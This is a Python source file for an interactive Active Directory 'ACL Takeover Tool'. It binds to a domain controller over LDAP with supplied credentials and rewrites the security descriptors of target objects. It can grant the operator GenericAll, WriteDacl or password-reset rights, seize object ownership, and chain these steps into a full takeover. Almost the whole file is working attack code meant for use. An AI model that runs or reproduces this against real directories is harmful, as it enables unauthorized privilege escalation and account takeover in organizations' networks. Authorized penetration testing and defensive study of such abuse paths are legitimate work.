#!/usr/bin/env python3
import sys
import re
import socket
import signal
import struct
import ssl
import platform
import uuid
import ldap3
from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, MODIFY_REPLACE
from ldap3.core.exceptions import LDAPBindError
from ldap3.protocol.microsoft import security_descriptor_control
from ldap3.utils.conv import escape_filter_chars
from colorama import Fore, Style, init


try:
    from impacket.ldap import ldaptypes
    from impacket.uuid import string_to_bin
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False
    print(Fore.RED + "[!] Impacket library not found. Install with: pip install impacket" + Style.RESET_ALL)
    sys.exit(1)

init(autoreset=True)

# ============================================================
# Signal Handler & Helpers
# ============================================================
def _exit_handler(sig, frame):
    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, _exit_handler)

def banner():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════════════════════╗
    ║                  ACL Takeover Tool                        ║
    ║       Exploit ACL privileges to control AD objects        ║
    ╚═══════════════════════════════════════════════════════════╝
    """ + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Running on: {platform.system()} {platform.release()}" + Style.RESET_ALL)

def validate_ip(ip):
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split('.'))

def validate_domain(domain):
    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
    if not re.match(pattern, domain):
        return False
    for part in domain.split('.'):
        if part.startswith('-') or part.endswith('-') or not part:
            return False
    return True

def get_input(prompt, validator=None, error_msg=None, allow_empty=False):
    while True:
        try:
            value = input(prompt).strip()
            if not value and not allow_empty:
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue
            if validator and value and not validator(value):
                print(Fore.RED + f"[!] {error_msg}" + Style.RESET_ALL)
                continue
            return value
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)

def check_ip_reachable(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((ip, 445))
        sock.close()
        return result == 0
    except Exception:
        return False

def check_credentials_and_domain(dc_ip, domain, username, password):
    try:
        base_dn = ','.join([f"DC={part}" for part in domain.split('.')])
        server  = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn    = Connection(server, user=f"{domain}\\{username}", password=password,
                             authentication=NTLM, auto_bind=True)
        conn.search(base_dn, '(objectClass=domain)', SUBTREE, attributes=['dc'])
        result  = len(conn.entries) > 0
        conn.unbind()
        return result
    except LDAPBindError:
        return "invalid_credentials"
    except Exception:
        return False

def ldap_connect(dc_ip, domain, username, password):
    try:
        server = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn   = Connection(server, user=f"{domain}\\{username}", password=password,
                            authentication=NTLM, auto_bind=True)
        return conn
    except Exception as e:
        print(Fore.RED + f"[-] LDAP connection failed: {e}" + Style.RESET_ALL)
        return None

def get_base_dn(domain):
    return ','.join([f"DC={part}" for part in domain.split('.')])

def get_object_dn(conn, base_dn, sam):
    try:
        conn.search(base_dn, f'(sAMAccountName={sam})', SUBTREE,
                    attributes=['distinguishedName', 'objectClass', 'objectSid'])
        return conn.entries[0] if conn.entries else None
    except Exception:
        return None

def get_object_sid(conn, base_dn, sam):
    entry = get_object_dn(conn, base_dn, sam)
    if entry:
        return str(entry['objectSid'].value)
    return None

def create_ace(sid, access_mask, ace_type='allowed'):

    nace = ldaptypes.ACE()
    if ace_type == 'allowed':
        nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
        acedata = ldaptypes.ACCESS_ALLOWED_ACE()
    else:
        nace['AceType'] = ldaptypes.ACCESS_DENIED_ACE.ACE_TYPE
        acedata = ldaptypes.ACCESS_DENIED_ACE()
    nace['AceFlags'] = 0x00
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = access_mask
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    nace['Ace'] = acedata
    return nace

def create_object_ace(sid, object_guid, access_mask=None, ace_type='allowed'):
 
    nace = ldaptypes.ACE()
    if ace_type == 'allowed':
        nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
        acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
    else:
        nace['AceType'] = ldaptypes.ACCESS_DENIED_OBJECT_ACE.ACE_TYPE
        acedata = ldaptypes.ACCESS_DENIED_OBJECT_ACE()
    nace['AceFlags'] = 0x00
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    if access_mask is None:

        acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
    else:
        acedata['Mask']['Mask'] = access_mask
    acedata['ObjectType'] = string_to_bin(object_guid)
    acedata['InheritedObjectType'] = b''
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
    nace['Ace'] = acedata
    return nace

def get_current_sd(conn, target_dn, sdflags=0x07):
 
    controls = security_descriptor_control(sdflags=sdflags)
    conn.search(target_dn, '(objectClass=*)', attributes=['nTSecurityDescriptor'], controls=controls)
    if conn.entries and 'nTSecurityDescriptor' in conn.entries[0]:
        raw_sd = conn.entries[0]['nTSecurityDescriptor'].raw_values[0]
        return ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw_sd)
    return None

def modify_sd(conn, target_dn, sd, sdflags):

    controls = security_descriptor_control(sdflags=sdflags)
    data = sd.getData()
    conn.modify(target_dn, {'nTSecurityDescriptor': [(MODIFY_REPLACE, [data])]}, controls=controls)
    return conn.result

# ============================================================
# 1. WriteDacl
# ============================================================
def abuse_write_dacl(conn, base_dn, attacker_sam, target_sam):
    print(Fore.CYAN + f"\n[*] WriteDacl: Modifying DACL of '{target_sam}'" + Style.RESET_ALL)

    print(Fore.CYAN + "\n[?] Choose permission to grant yourself:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. GenericAll        (Full Control)  - 0x000F01FF")
    print(Fore.WHITE + "    2. GenericWrite       (Write props)  - 0x00000028")
    print(Fore.WHITE + "    3. WriteOwner                        - 0x00080000")
    print(Fore.WHITE + "    4. WriteDacl                         - 0x00040000")
    print(Fore.WHITE + "    5. ResetPassword  (ForceChangePass)  - 0x00000100")
    print(Fore.RED   + "    0. Back")

    perm_choice = get_input(Fore.CYAN + "[?] Choice: " + Style.RESET_ALL)

    perm_map = {
        '1': (0x000F01FF, "GenericAll", False),
        '2': (0x00000028, "GenericWrite", False),
        '3': (0x00080000, "WriteOwner", False),
        '4': (0x00040000, "WriteDacl", False),
        '5': (0x00000100, "ResetPassword", True),   # يحتاج Object ACE
    }

    if perm_choice == '0':
        return
    if perm_choice not in perm_map:
        print(Fore.RED + "[!] Invalid choice!" + Style.RESET_ALL)
        return

    access_mask, perm_name, is_extended = perm_map[perm_choice]

    target_entry = get_object_dn(conn, base_dn, target_sam)
    if not target_entry:
        print(Fore.RED + f"[-] Target '{target_sam}' not found!" + Style.RESET_ALL)
        return
    target_dn = str(target_entry.distinguishedName)

    attacker_sid = get_object_sid(conn, base_dn, attacker_sam)
    if not attacker_sid:
        print(Fore.RED + f"[-] Attacker '{attacker_sam}' not found!" + Style.RESET_ALL)
        return

    sd = get_current_sd(conn, target_dn, sdflags=0x04)  # DACL only
    if not sd:
        print(Fore.RED + "[-] Failed to read current Security Descriptor." + Style.RESET_ALL)
        return


    if is_extended:
        if perm_choice == '5':
            # ResetPassword GUID
            guid = "00299570-246d-11d0-a768-00aa006e0529"
        else:

            guid = "00000000-0000-0000-0000-000000000000"
        ace = create_object_ace(attacker_sid, guid, access_mask=None, ace_type='allowed')
    else:
        ace = create_ace(attacker_sid, access_mask, ace_type='allowed')


    if sd['Dacl'] is None:
        sd['Dacl'] = ldaptypes.ACL()
        sd['Dacl']['AclRevision'] = ldaptypes.ACL.ACL_REVISION_DS
        sd['Dacl']['Sbz1'] = 0
        sd['Dacl']['Sbz2'] = 0
        sd['Dacl'].aces = []
    sd['Dacl'].aces.append(ace)
    sd['Dacl']['AceCount'] = len(sd['Dacl'].aces)


    result = modify_sd(conn, target_dn, sd, sdflags=0x04)
    if result['result'] == 0:
        print(Fore.GREEN + f"[+] WriteDacl success! Granted '{perm_name}' on '{target_sam}'!" + Style.RESET_ALL)
        if perm_choice == '5':
            print(Fore.YELLOW + "[*] You can now reset the password of this account." + Style.RESET_ALL)
    else:
        err = result.get('message', 'unknown error')
        print(Fore.RED + f"[-] WriteDacl failed: {err}" + Style.RESET_ALL)

# ============================================================
# 2. WriteOwner
# ============================================================
def abuse_write_owner(conn, base_dn, attacker_sam, target_sam, limited=False):
    label = "WriteOwner (Limited)" if limited else "WriteOwner"
    print(Fore.CYAN + f"\n[*] {label}: Taking ownership of '{target_sam}'" + Style.RESET_ALL)

    target_entry = get_object_dn(conn, base_dn, target_sam)
    if not target_entry:
        print(Fore.RED + f"[-] Target '{target_sam}' not found!" + Style.RESET_ALL)
        return
    target_dn = str(target_entry.distinguishedName)

    attacker_sid = get_object_sid(conn, base_dn, attacker_sam)
    if not attacker_sid:
        print(Fore.RED + f"[-] Attacker '{attacker_sam}' not found!" + Style.RESET_ALL)
        return


    sd = get_current_sd(conn, target_dn, sdflags=0x01)  # Owner only
    if not sd:
        print(Fore.RED + "[-] Failed to read current Security Descriptor." + Style.RESET_ALL)
        return

    
    new_owner_sid = ldaptypes.LDAP_SID()
    new_owner_sid.fromCanonical(attacker_sid)
    sd['OwnerSid'] = new_owner_sid

    
    result = modify_sd(conn, target_dn, sd, sdflags=0x01)
    if result['result'] == 0:
        print(Fore.GREEN + f"[+] {label} success! '{attacker_sam}' is now owner of '{target_sam}'!" + Style.RESET_ALL)
        if limited:
            print(Fore.YELLOW + "[*] Limited rights: You own the object but DACL is restricted." + Style.RESET_ALL)
            print(Fore.YELLOW + "[*] Use WriteDacl next to grant yourself full permissions." + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + "[*] Next step: Use WriteDacl to grant yourself GenericAll!" + Style.RESET_ALL)
    else:
        err = result.get('message', 'unknown error')
        print(Fore.RED + f"[-] {label} failed: {err}" + Style.RESET_ALL)



def abuse_owns(conn, base_dn, attacker_sam, target_sam, mode="full"):
    mode_labels = {"full": "Owns (Full)", "limited": "OwnsLimitedRights", "raw": "OwnsRaw"}
    label = mode_labels.get(mode, "Owns")
    print(Fore.CYAN + f"\n[*] {label}: Abusing ownership of '{target_sam}'" + Style.RESET_ALL)

    target_entry = get_object_dn(conn, base_dn, target_sam)
    if not target_entry:
        print(Fore.RED + f"[-] Target '{target_sam}' not found!" + Style.RESET_ALL)
        return
    target_dn = str(target_entry.distinguishedName)

    attacker_sid = get_object_sid(conn, base_dn, attacker_sam)
    if not attacker_sid:
        print(Fore.RED + f"[-] Attacker '{attacker_sam}' not found!" + Style.RESET_ALL)
        return

    if mode == "raw":
      
        abuse_write_owner(conn, base_dn, attacker_sam, target_sam, limited=True)
        return

   
    if mode == "full":
        access_mask = 0x000F01FF
        perm_name = "GenericAll"
    else:
        access_mask = 0x00040000
        perm_name = "WriteDacl (limited)"

    sd = get_current_sd(conn, target_dn, sdflags=0x04)  # DACL only
    if not sd:
        print(Fore.RED + "[-] Failed to read current DACL." + Style.RESET_ALL)
        return

    ace = create_ace(attacker_sid, access_mask, ace_type='allowed')
    if sd['Dacl'] is None:
        sd['Dacl'] = ldaptypes.ACL()
        sd['Dacl']['AclRevision'] = ldaptypes.ACL.ACL_REVISION_DS
        sd['Dacl']['Sbz1'] = 0
        sd['Dacl']['Sbz2'] = 0
        sd['Dacl'].aces = []
    sd['Dacl'].aces.append(ace)
    sd['Dacl']['AceCount'] = len(sd['Dacl'].aces)

    result = modify_sd(conn, target_dn, sd, sdflags=0x04)
    if result['result'] == 0:
        print(Fore.GREEN + f"[+] {label} success! Granted '{perm_name}' on '{target_sam}'!" + Style.RESET_ALL)
    else:
        err = result.get('message', 'unknown error')
        print(Fore.RED + f"[-] {label} failed: {err}" + Style.RESET_ALL)

# ============================================================
# 4. Full Takeover Chain
# ============================================================
def abuse_full_takeover(conn, base_dn, attacker_sam, target_sam):
    print(Fore.CYAN + f"\n[*] Full Takeover Chain on '{target_sam}'" + Style.RESET_ALL)
    print(Fore.YELLOW + "[*] Step 1: WriteOwner - Taking ownership..." + Style.RESET_ALL)

    target_entry = get_object_dn(conn, base_dn, target_sam)
    if not target_entry:
        print(Fore.RED + f"[-] Target '{target_sam}' not found!" + Style.RESET_ALL)
        return
    target_dn = str(target_entry.distinguishedName)

    attacker_sid = get_object_sid(conn, base_dn, attacker_sam)
    if not attacker_sid:
        print(Fore.RED + f"[-] Attacker '{attacker_sam}' not found!" + Style.RESET_ALL)
        return

    # Step 1: WriteOwner
    sd_owner = get_current_sd(conn, target_dn, sdflags=0x01)
    if not sd_owner:
        print(Fore.RED + "[-] Failed to read current Owner." + Style.RESET_ALL)
        return
    new_owner = ldaptypes.LDAP_SID()
    new_owner.fromCanonical(attacker_sid)
    sd_owner['OwnerSid'] = new_owner
    result = modify_sd(conn, target_dn, sd_owner, sdflags=0x01)
    if result['result'] != 0:
        err = result.get('message', 'unknown error')
        print(Fore.RED + f"[-] Step 1 failed: {err}" + Style.RESET_ALL)
        return
    print(Fore.GREEN + f"[+] Step 1 done! '{attacker_sam}' is now owner of '{target_sam}'!" + Style.RESET_ALL)

    # Step 2: WriteDacl - Grant GenericAll
    print(Fore.YELLOW + "[*] Step 2: WriteDacl - Granting GenericAll..." + Style.RESET_ALL)
    sd_dacl = get_current_sd(conn, target_dn, sdflags=0x04)
    if not sd_dacl:
        print(Fore.RED + "[-] Failed to read current DACL." + Style.RESET_ALL)
        return
    ace = create_ace(attacker_sid, 0x000F01FF, 'allowed')
    if sd_dacl['Dacl'] is None:
        sd_dacl['Dacl'] = ldaptypes.ACL()
        sd_dacl['Dacl']['AclRevision'] = ldaptypes.ACL.ACL_REVISION_DS
        sd_dacl['Dacl']['Sbz1'] = 0
        sd_dacl['Dacl']['Sbz2'] = 0
        sd_dacl['Dacl'].aces = []
    sd_dacl['Dacl'].aces.append(ace)
    sd_dacl['Dacl']['AceCount'] = len(sd_dacl['Dacl'].aces)
    result = modify_sd(conn, target_dn, sd_dacl, sdflags=0x04)
    if result['result'] == 0:
        print(Fore.GREEN + f"[+] Step 2 done! GenericAll granted on '{target_sam}'!" + Style.RESET_ALL)
        print(Fore.GREEN + "\n[+] Full Takeover Complete!" + Style.RESET_ALL)
        print(Fore.GREEN + f"[+] You now have full control over '{target_sam}'." + Style.RESET_ALL)
    else:
        err = result.get('message', 'unknown error')
        print(Fore.RED + f"[-] Step 2 failed: {err}" + Style.RESET_ALL)

# ============================================================
# Main Menu
# ============================================================
def main_menu(conn, base_dn, attacker_sam):
    while True:
        print(Fore.CYAN + "\n" + "=" * 62 + Style.RESET_ALL)
        print(Fore.CYAN + "  [ ACL Takeover - Object Control via ACL ]" + Style.RESET_ALL)
        print(Fore.CYAN + "=" * 62 + Style.RESET_ALL)
        print(Fore.WHITE + """
    1.  WriteDacl              - Modify DACL to grant yourself any permission

    2.  WriteOwner             - Take ownership of target object

    3.  WriteOwnerLimitedRights- Take ownership (limited rights mode)

    4.  WriteOwnerRaw          - Take ownership (raw SD write)

    5.  Owns                   - Abuse existing ownership (grant GenericAll)

    6.  OwnsLimitedRights      - Abuse ownership with limited permissions

    7.  OwnsRaw                - Abuse ownership via raw SD write

    8.  Full Takeover Chain    - WriteOwner + WriteDacl in one shot
    """)
        print(Fore.RED   + "    0.  Exit")
        print(Fore.CYAN  + "=" * 62 + Style.RESET_ALL)

        choice = get_input(Fore.CYAN + "[?] Choice: " + Style.RESET_ALL)

        if choice == '0':
            print(Fore.YELLOW + "\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)

        elif choice in ['1', '2', '3', '4', '5', '6', '7', '8']:
            target_sam = get_input(Fore.CYAN + "[?] Enter target username: " + Style.RESET_ALL)

            if choice == '1':
                abuse_write_dacl(conn, base_dn, attacker_sam, target_sam)
            elif choice == '2':
                abuse_write_owner(conn, base_dn, attacker_sam, target_sam, limited=False)
            elif choice == '3':
                abuse_write_owner(conn, base_dn, attacker_sam, target_sam, limited=True)
            elif choice == '4':
                abuse_owns(conn, base_dn, attacker_sam, target_sam, mode="raw")
            elif choice == '5':
                abuse_owns(conn, base_dn, attacker_sam, target_sam, mode="full")
            elif choice == '6':
                abuse_owns(conn, base_dn, attacker_sam, target_sam, mode="limited")
            elif choice == '7':
                abuse_owns(conn, base_dn, attacker_sam, target_sam, mode="raw")
            elif choice == '8':
                abuse_full_takeover(conn, base_dn, attacker_sam, target_sam)
        else:
            print(Fore.RED + "[!] Invalid choice!" + Style.RESET_ALL)

# ============================================================
# Entry Point
# ============================================================
if __name__ == '__main__':
    banner()

    dc_ip = get_input(
        Fore.CYAN + "[?] Enter DC IP Address  : " + Style.RESET_ALL,
        validate_ip, "Invalid IP! Example: 192.168.1.1"
    )
    print(Fore.YELLOW + "[*] Checking DC reachability..." + Style.RESET_ALL)
    if not check_ip_reachable(dc_ip):
        print(Fore.RED + f"[!] Cannot reach {dc_ip}!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + f"[+] DC {dc_ip} is reachable!" + Style.RESET_ALL)

    domain   = get_input(Fore.CYAN + "[?] Enter Domain Name    : " + Style.RESET_ALL,
                         validate_domain, "Invalid domain! Example: cs.org")
    username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
    password = get_input(Fore.CYAN + "[?] Enter Password       : " + Style.RESET_ALL)

    print(Fore.YELLOW + "[*] Verifying credentials and domain..." + Style.RESET_ALL)
    result = check_credentials_and_domain(dc_ip, domain, username, password)
    if result == "invalid_credentials":
        print(Fore.RED + "[!] Invalid credentials!" + Style.RESET_ALL)
        sys.exit(1)
    elif not result:
        print(Fore.RED + f"[!] Domain '{domain}' not found!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + "[+] Credentials verified!" + Style.RESET_ALL)
    print(Fore.GREEN + f"[+] Domain '{domain}' verified!" + Style.RESET_ALL)

    print(Fore.YELLOW + "\n[*] Connecting to LDAP..." + Style.RESET_ALL)
    conn = ldap_connect(dc_ip, domain, username, password)
    if not conn:
        sys.exit(1)
    print(Fore.GREEN + "[+] LDAP connected!" + Style.RESET_ALL)

    base_dn = get_base_dn(domain)

    main_menu(conn, base_dn, username)
